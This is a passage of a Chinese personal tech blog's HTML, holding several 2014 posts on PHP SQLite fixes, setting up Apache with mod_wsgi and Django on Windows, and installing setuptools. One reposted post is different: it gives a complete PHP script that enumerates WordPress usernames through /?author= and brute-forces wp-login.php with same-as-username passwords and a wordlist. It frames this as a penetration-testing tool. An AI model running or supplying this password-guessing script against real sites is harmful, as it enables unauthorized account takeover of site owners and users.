class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; Directory in which the loadable extensions (modules) reside.</span></span><br><span class="line"><span class="attr">extension_dir</span> = <span class="string">"/usr/local/php/lib/php/extensions/no-debug-non-zts-20060613/"</span></span><br><span class="line"><span class="attr">extension</span> = <span class="string">"memcache.so"</span></span><br><span class="line"><span class="attr">extension</span> = <span class="string">"pdo_mysql.so"</span></span><br></pre></td></tr></table></figure><p>修改为</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">; Directory in which the loadable extensions (modules) reside.</span></span><br><span class="line"><span class="attr">extension_dir</span> = <span class="string">"/usr/local/php/lib/php/extensions/no-debug-non-zts-20060613/"</span></span><br><span class="line"><span class="attr">extension</span> = <span class="string">"memcache.so"</span></span><br><span class="line"><span class="attr">extension</span> = <span class="string">"pdo_mysql.so"</span></span><br><span class="line"><span class="attr">extension</span> = <span class="string">"sqlite3.so"</span></span><br></pre></td></tr></table></figure><p>重启服务即可。</p><p>但是当我执行 文件时出错了<br>SQLite header and source version mismatch<br>解决办法参考：<br><a href="http://stackoverflow.com/questions/6696861/how-do-i-upgrade-my-sqlite3-package-on-debian-lenny" target="_blank" rel="noopener">http://stackoverflow.com/questions/6696861/how-do-i-upgrade-my-sqlite3-package-on-debian-lenny</a></p><p><strong>其它</strong></p><p>sqlite3 数据库错误，<code>Error: database disk image is malformed</code> 目前搜索的解决的方案都说无法解决。只能通过备份解决，此问题是在本地测试正常，上传到服务器时出现此错误，你可以在本地通过备份操作，先导出数据库为sql文件，然后上传sql文件，在服务器端重新创建。</p><p>备份操作：<br></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlite3  testdb <span class="string">".dump"</span> &gt; <span class="keyword">dump</span></span><br><span class="line">mv testdb.mdb testdb.mdb.backup</span><br><span class="line">cat <span class="keyword">dump</span> | sqlite3 testdb.mdb</span><br></pre></td></tr></table></figure><p></p><p>更新： 由于使用ftp工具直接上传的sqlite数据库，所以出现问题，你可以把传输模式改为二进制。或者打包成压缩后再传输。经测试可以解决上传之后的sqlite数据库database disk image is malformed问题。</p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="https://www.love4026.org/313755/windows7-64位-xampp-python3-3-2-django-web环境搭配/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Ray Chang"><meta itemprop="description" content="Think Difficulty"><meta itemprop="image" content="/logo.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ray's Blog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/313755/windows7-64位-xampp-python3-3-2-django-web环境搭配/" itemprop="url">windows7 64位 xampp python3.3.2 django web环境搭配</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2014-03-13T13:59:54+08:00">2014-03-13</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/个人日志/" itemprop="url" rel="index"><span itemprop="name">个人日志</span></a></span></span> <span class="post-meta-divider">|</span><span class="post-wordcount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">字数统计&#58;</span> <span title="字数统计">760</span></span></div></header><div class="post-body" itemprop="articleBody"><p>windows7 64位 XAMPP python3.3.2 web环境搭配</p><p>本来根据网上的资料想使用mod_python，可是没有对应python3.3.2的版本，在<a href="http://stackoverflow.com/questions/3319545/mod-wsgi-mod-python-or-just-cgi这个问题上，发现是建议使用mod_wsgi" target="_blank" rel="noopener">http://stackoverflow.com/questions/3319545/mod-wsgi-mod-python-or-just-cgi这个问题上，发现是建议使用mod_wsgi</a><br>从<a href="http://code.google.com/p/modwsgi/wiki/DownloadTheSoftware?tm=2" target="_blank" rel="noopener">http://code.google.com/p/modwsgi/wiki/DownloadTheSoftware?tm=2</a> 了解到mod wsgi在window下的安装过程。</p><p>mod_wsgi的下载地址为：<a href="http://www.lfd.uci.edu/~gohlke/pythonlibs/#mod_wsgi" target="_blank" rel="noopener">http://www.lfd.uci.edu/~gohlke/pythonlibs/#mod_wsgi</a></p><p>根据版本号下载相应文件，python3.3.2对应<br><a href="http://www.lfd.uci.edu/~gohlke/pythonlibs/bmsicnqj/mod_wsgi-3.4.ap24.win-amd64-py3.3.zip" target="_blank" rel="noopener">http://www.lfd.uci.edu/~gohlke/pythonlibs/bmsicnqj/mod_wsgi-3.4.ap24.win-amd64-py3.3.zip</a></p><p>解压mod_wsgi.so并复制到你的apache安装目录下的modules文件夹下，比如我的使用的是xampp，相应的apache目录为 D:\xampp\apache\modules</p><p>在httpd.conf文件中加入</p><p>LoadModule wsgi_module modules/mod_wsgi.so</p><p>但总是失败 can not load modules/mod_wsgi.so into server ，最后是把xampp中的apache替换成 <a href="http://www.apachelounge.com/download/" target="_blank" rel="noopener">http://www.apachelounge.com/download/</a> 这个网站上的相应版本的apache,然后才成功。 【Apache2.4.4需要VC10库支持】</p><p>下载2.4后，mod_wsgi可以用了，但xampp与php的联系不可用了，重新下载php5.4 VC11 x64解决问题。<br><a href="http://windows.php.net/downloads/releases/php-5.5.10-Win32-VC11-x64.zip" target="_blank" rel="noopener">http://windows.php.net/downloads/releases/php-5.5.10-Win32-VC11-x64.zip</a></p><p>还需要修改httpd.conf ，添加以下代码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">WSGIScriptAlias</span> /googlescrape <span class="string">"D:/workfiles/wwwroot/googlescrape/"</span></span><br><span class="line"><span class="section">&lt;Directory "D:/workfiles/wwwroot/googlescrape"&gt;</span></span><br><span class="line">    <span class="attribute"><span class="nomarkup">Order</span></span> allow,deny</span><br><span class="line">    <span class="attribute"><span class="nomarkup">Allow</span></span> from <span class="literal">all</span></span><br><span class="line"><span class="section">&lt;/Directory&gt;</span></span><br></pre></td></tr></table></figure><p>在xampp中，你也可以添加到httpd-vhosts.conf中</p><p>也行你会发现新装php后，mysql连接不能用了<br>解决办法<br>复制一份php.ini-development为php.ini, 在PHP.ini中找到<br><code>extension_dir = &quot;ext&quot; （大约852行）</code><br>改为<br><code>extension_dir = &quot;d:/php/ext&quot;</code><br>并去掉注释</p><p>找到;extension=php_mysql.dll （大约1005行）<br>将’;’去掉，改为<br>extension=php_mysql.dll</p><p>重启apache服务即可。</p><p>Django 是 使用 easy_install Django 安装的。</p><p>进入相应目录(例如：<code>D:\workfiles\wwwroot\</code>)使用Django-admin.py startproject googlescrape 生成相应项目<br>如果需要数据库使用：<br>执行 manage.py syncdb 生成数据库。</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">D:\workfiles\wwwroot\googlescrape&gt;manage.py syncdb</span><br><span class="line"><span class="function"><span class="title">Creating</span></span> tables ...</span><br><span class="line">Creating <span class="keyword">table</span> django_admin_log</span><br><span class="line">Creating <span class="keyword">table</span> auth_permission</span><br><span class="line">Creating <span class="keyword">table</span> auth_group_permissions</span><br><span class="line">Creating <span class="keyword">table</span> auth_group</span><br><span class="line">Creating <span class="keyword">table</span> auth_user_groups</span><br><span class="line">Creating <span class="keyword">table</span> auth_user_user_permissions</span><br><span class="line">Creating <span class="keyword">table</span> auth_user</span><br><span class="line">Creating <span class="keyword">table</span> django_content_type</span><br><span class="line">Creating <span class="keyword">table</span> django_session</span><br><span class="line"></span><br><span class="line">You just installed Django<span class="string">'s auth system, which means you don'</span>t have any superuse</span><br><span class="line">rs defined.</span><br><span class="line">Would you like to create one now? (yes/no): yes</span><br><span class="line">Username (leave blank to use <span class="string">'administrator'</span>): admin</span><br><span class="line">Email address: xxx@gmail.com</span><br><span class="line">Password:</span><br><span class="line">Password (again):</span><br><span class="line">Superuser created successfully.</span><br><span class="line">Installing custom SQL ...</span><br><span class="line">Installing indexes ...</span><br><span class="line">Installed <span class="number">0</span> object(s) from <span class="number">0</span> fixture(s)</span><br></pre></td></tr></table></figure><p>注：<br>有个相关教程在里：<a href="http://enkoding.blogspot.jp/2013/01/setup-python-for-web-in-7-steps-on.html，" target="_blank" rel="noopener">http://enkoding.blogspot.jp/2013/01/setup-python-for-web-in-7-steps-on.html，</a> 可能需要翻墙，我的安装比较麻烦，主要是我的xampp不支持上面的各种mod_wsgi，我最后不得不在<a href="http://www.apachelounge.com/download/重新下载apache2.4" target="_blank" rel="noopener">http://www.apachelounge.com/download/重新下载apache2.4</a></p><p>查到相关资料，可能是因为mod_wsgi必须是apache版本64位的，所以32位的会出问题，可以尝试下载一个64位的xampp试试，我目前还没有尝试。</p><p>参考资料：<br><a href="http://agong.org/2013/windows64-python3-apache-wsgi-django.html" target="_blank" rel="noopener">http://agong.org/2013/windows64-python3-apache-wsgi-django.html</a><br><a href="http://www.cnblogs.com/zhoujie/archive/2013/05/11/django1.html" target="_blank" rel="noopener">http://www.cnblogs.com/zhoujie/archive/2013/05/11/django1.html</a><br><a href="http://www.cnblogs.com/wang_yb/archive/2011/04/14/2016513.html" target="_blank" rel="noopener">http://www.cnblogs.com/wang_yb/archive/2011/04/14/2016513.html</a><br><a href="http://www.vimer.cn/2010/09/apachemod_wsgidjango%E5%9C%A8windows%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2.html" target="_blank" rel="noopener">http://www.vimer.cn/2010/09/apachemod_wsgidjango%E5%9C%A8windows%E4%B8%8B%E7%9A%84%E9%83%A8%E7%BD%B2.html</a></p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="https://www.love4026.org/313752/windows7下安装python3-3的setuptools工具/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Ray Chang"><meta itemprop="description" content="Think Difficulty"><meta itemprop="image" content="/logo.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ray's Blog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/313752/windows7下安装python3-3的setuptools工具/" itemprop="url">windows7下安装python3.3的setuptools工具</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2014-03-12T06:08:14+08:00">2014-03-12</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/个人日志/" itemprop="url" rel="index"><span itemprop="name">个人日志</span></a></span></span> <span class="post-meta-divider">|</span><span class="post-wordcount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">字数统计&#58;</span> <span title="字数统计">360</span></span></div></header><div class="post-body" itemprop="articleBody"><p>安装方法见： <a href="https://pypi.python.org/pypi/setuptools/0.9.8#windows" target="_blank" rel="noopener">https://pypi.python.org/pypi/setuptools/0.9.8#windows</a></p><p>安装过程：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">copying setuptools.egg-info<span class="string">\top_level.txt</span> <span class="function">-&gt;</span> build<span class="string">\bdist.win-amd64\egg\EGG-INFO</span></span><br><span class="line">copying setuptools.egg-info<span class="string">\zip-safe</span> <span class="function">-&gt;</span> build<span class="string">\bdist.win-amd64\egg\EGG-INFO</span></span><br><span class="line">creating dist</span><br><span class="line">creating <span class="string">'dist\setuptools-3.1-py3.3.egg'</span> <span class="keyword">and</span> adding <span class="string">'build\bdist.win-amd64\egg'</span></span><br><span class="line"><span class="keyword">to</span> <span class="literal">it</span></span><br><span class="line">removing <span class="string">'build\bdist.win-amd64\egg'</span> (<span class="keyword">and</span> everything under <span class="literal">it</span>)</span><br><span class="line">Processing setuptools-<span class="number">3.1</span>-py3.<span class="number">3.egg</span></span><br><span class="line">Copying setuptools-<span class="number">3.1</span>-py3.<span class="number">3.egg</span> <span class="keyword">to</span> c:<span class="string">\python33\lib\site-packages</span></span><br><span class="line">Adding setuptools <span class="number">3.1</span> <span class="keyword">to</span> easy-install.pth file</span><br><span class="line">Installing easy_install-script.py script <span class="keyword">to</span> C:<span class="string">\Python33\Scripts</span></span><br><span class="line">Installing easy_install.exe script <span class="keyword">to</span> C:<span class="string">\Python33\Scripts</span></span><br><span class="line">Installing easy_install-<span class="number">3.3</span>-script.py script <span class="keyword">to</span> C:<span class="string">\Python33\Scripts</span></span><br><span class="line">Installing easy_install-<span class="number">3.3</span>.exe script <span class="keyword">to</span> C:<span class="string">\Python33\Scripts</span></span><br><span class="line"></span><br><span class="line">Installed c:<span class="string">\python33\lib\site-packages\setuptools-3.1-py3.3.egg</span></span><br><span class="line">Processing dependencies <span class="keyword">for</span> setuptools==<span class="number">3.1</span></span><br><span class="line">Finished processing dependencies <span class="keyword">for</span> setuptools==<span class="number">3.1</span></span><br></pre></td></tr></table></figure><p>运行python程序时出现</p><pre><code>No module named &apos;requests&apos;
You can install missing modules with `pip3 install [modulename]`
</code></pre><p>安装好setuptools后，使用以下命令即可安装 <code>requests</code></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="tag">\<span class="name">Python</span></span>33<span class="tag">\<span class="name">Scripts</span></span>&gt;easy_install.exe requests</span><br><span class="line">Searching for requests</span><br><span class="line">Reading https://pypi.python.org/simple/requests/</span><br><span class="line">Best match: requests 2.2.1</span><br><span class="line">Downloading https://pypi.python.org/packages/source/r/requests/requests-2.2.1.ta</span><br><span class="line">r.gz#md5=ac27081135f58d1a43e4fb38258d6f4e</span><br><span class="line">Processing requests-2.2.1.tar.gz</span><br><span class="line">Writing c:<span class="tag">\<span class="name">users</span></span><span class="tag">\<span class="name">admini</span></span>~1<span class="tag">\<span class="name">appdata</span></span><span class="tag">\<span class="name">local</span></span><span class="tag">\<span class="name">temp</span></span><span class="tag">\<span class="name">easy</span></span>_install-4bjzke<span class="tag">\<span class="name">requests</span></span>-2.2.1<span class="tag">\</span></span><br><span class="line">setup.cfg</span><br><span class="line">Running requests-2.2.1<span class="tag">\<span class="name">setup</span></span>.py -q bdist_egg --dist-dir c:<span class="tag">\<span class="name">users</span></span><span class="tag">\<span class="name">admini</span></span>~1<span class="tag">\<span class="name">appdat</span></span></span><br><span class="line">a<span class="tag">\<span class="name">local</span></span><span class="tag">\<span class="name">temp</span></span><span class="tag">\<span class="name">easy</span></span>_install-4bjzke<span class="tag">\<span class="name">requests</span></span>-2.2.1<span class="tag">\<span class="name">egg</span></span>-dist-tmp-9woril</span><br><span class="line">Adding requests 2.2.1 to easy-install.pth file</span><br><span class="line"></span><br><span class="line">Installed c:<span class="tag">\<span class="name">python</span></span>33<span class="tag">\<span class="name">lib</span></span><span class="tag">\<span class="name">site</span></span>-packages<span class="tag">\<span class="name">requests</span></span>-2.2.1-py3.3.egg</span><br><span class="line">Processing dependencies for requests</span><br><span class="line">Finished processing dependencies for requests</span><br></pre></td></tr></table></figure></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="https://www.love4026.org/313748/跑wordpress用户密码脚本/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Ray Chang"><meta itemprop="description" content="Think Difficulty"><meta itemprop="image" content="/logo.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ray's Blog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/313748/跑wordpress用户密码脚本/" itemprop="url">跑wordpress用户密码脚本</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2014-03-10T06:10:15+08:00">2014-03-10</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/转载/" itemprop="url" rel="index"><span itemprop="name">转载</span></a></span></span> <span class="post-meta-divider">|</span><span class="post-wordcount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">字数统计&#58;</span> <span title="字数统计">519</span></span></div></header><div class="post-body" itemprop="articleBody"><p>在做渗透测试的时候，有时候会遇到一个wordpress博客，如果版本比较新，插件也没有漏洞的话，可以爆破用户名密码来尝试下。</p><p>大脑混沌情况下写的，有bug欢迎提出，由于是php的所以跑起来比较慢，下次发包还是调用命令结合hydra来爆破。</p><p>原理是通过URL /?author= 遍历获取用户名，然后先跑用户名与密码相同的用户，再调用同目录下pass.txt中的密码文件进行爆破。</p><p>默认获取前10个用户，可自行修改。</p><p>使用方法：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php wordpress<span class="selector-class">.php</span> http:<span class="comment">//www.test.com</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">set_time_limit(<span class="number">0</span>); </span></span><br><span class="line"><span class="php">$domain = $argv[<span class="number">1</span>];</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="comment">//获取用户名</span></span></span><br><span class="line"><span class="php"><span class="keyword">for</span> ($i=<span class="number">1</span>; $i &lt;= <span class="number">10</span>; $i++) &#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $url = $domain.<span class="string">"/?author="</span>.$i;</span></span><br><span class="line"><span class="php">    $response = httprequest($url,<span class="number">0</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($response == <span class="number">404</span>) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">continue</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $pattern = <span class="string">"/author\/(.*)\/feed/"</span>;</span></span><br><span class="line"><span class="php">    preg_match($pattern, $response, $name);</span></span><br><span class="line"><span class="php">    $namearray[] = $name[<span class="number">1</span>];</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"共获取用户"</span>.count($namearray).<span class="string">"名用户\n"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"正在破解用户名与密码相同的用户：\n"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$crackname = crackpassword($namearray,<span class="string">"same"</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$passwords = file(<span class="string">"pass.txt"</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"正在破解弱口令用户：\n"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($crackname) &#123;</span></span><br><span class="line"><span class="php">    $namearray = array_diff($namearray,$crackname);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">crackpassword($namearray,$passwords);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">crackpassword</span><span class="params">($namearray,$passwords)</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">global</span> $domain;</span></span><br><span class="line"><span class="php">    $crackname = <span class="string">""</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">foreach</span> ($namearray <span class="keyword">as</span> $name) &#123;</span></span><br><span class="line"><span class="php">        $url = $domain.<span class="string">"/wp-login.php"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> ($passwords == <span class="string">"same"</span>) &#123;</span></span><br><span class="line"><span class="php">            $post = <span class="string">"log="</span>.urlencode($name).<span class="string">"&amp;amp;pwd="</span>.urlencode($name).<span class="string">"&amp;amp;wp-submit=%E7%99%BB%E5%BD%95&amp;amp;redirect_to="</span>.urlencode($domain).<span class="string">"%2Fwp-admin%2F&amp;amp;testcookie=1"</span>;</span></span><br><span class="line"><span class="php">            $pos = strpos(httprequest($url,$post),<span class="string">'div id="login_error"'</span>);</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span> ($pos === <span class="keyword">false</span>) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> <span class="string">"$name $name"</span>.<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">                $crackname[] = $name;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">foreach</span> ($passwords <span class="keyword">as</span> $pass) &#123;</span></span><br><span class="line"><span class="php">                $post = <span class="string">"log="</span>.urlencode($name).<span class="string">"&amp;amp;pwd="</span>.urlencode($pass).<span class="string">"&amp;amp;wp-submit=%E7%99%BB%E5%BD%95&amp;amp;redirect_to="</span>.urlencode($domain).<span class="string">"%2Fwp-admin%2F&amp;amp;testcookie=1"</span>;</span></span><br><span class="line"><span class="php">                $pos = strpos(httprequest($url,$post),<span class="string">'div id="login_error"'</span>);</span></span><br><span class="line"><span class="php">                <span class="keyword">if</span> ($pos === <span class="keyword">false</span>) &#123;</span></span><br><span class="line"><span class="php">                    <span class="keyword">echo</span> <span class="string">"$name $pass"</span>.<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">                &#125;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> $crackname;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">httprequest</span><span class="params">($url,$post)</span></span>&#123;</span></span><br><span class="line"><span class="php">    $ch = curl_init(); </span></span><br><span class="line"><span class="php">    curl_setopt($ch, CURLOPT_URL, <span class="string">"$url"</span>); </span></span><br><span class="line"><span class="php">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span></span><br><span class="line"><span class="php">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="keyword">false</span>); </span></span><br><span class="line"><span class="php">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,<span class="number">1</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($post)&#123;</span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_POST, <span class="number">1</span>);<span class="comment">//post提交方式</span></span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    $output = curl_exec($ch); </span></span><br><span class="line"><span class="php">    $httpcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);</span></span><br><span class="line"><span class="php">    curl_close($ch);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> ($httpcode == <span class="number">404</span>) &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="number">404</span>;</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> $output;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>原文：<a href="http://drops.wooyun.org/tools/601" target="_blank" rel="noopener">http://drops.wooyun.org/tools/601</a></p></div><footer class="post-footer"><div class="post-eof"></div></footer></div></article><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="https://www.love4026.org/313742/0xhost免费1g空间申请50g流量支持绑定5个域名/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Ray Chang"><meta itemprop="description" content="Think Difficulty"><meta itemprop="image" content="/logo.png"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Ray's Blog"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"> <a class="post-title-link" href="/313742/0xhost免费1g空间申请50g流量支持绑定5个域名/" itemprop="url">0xhost免费1g空间申请50g流量支持绑定5个域名</a></h2><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2014-03-09T14:47:02+08:00">2014-03-09</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/个人日志/" itemprop="url" rel="index"><span itemprop="name">个人日志</span></a></span> ， <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/技术/" itemprop="url" rel="index"><span itemprop="name">技术</span></a></span></span> <span class="post-meta-divider">|</span><span class="post-wordcount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">字数统计&#58;</span> <span title="字数统计">133</span></span></div></header><div class="post-body" itemprop="articleBody"><p>0xhost免费1G空间申请/50G流量/支持绑定5个域名！没有过多的介绍，典型的国外CP分销商，<span 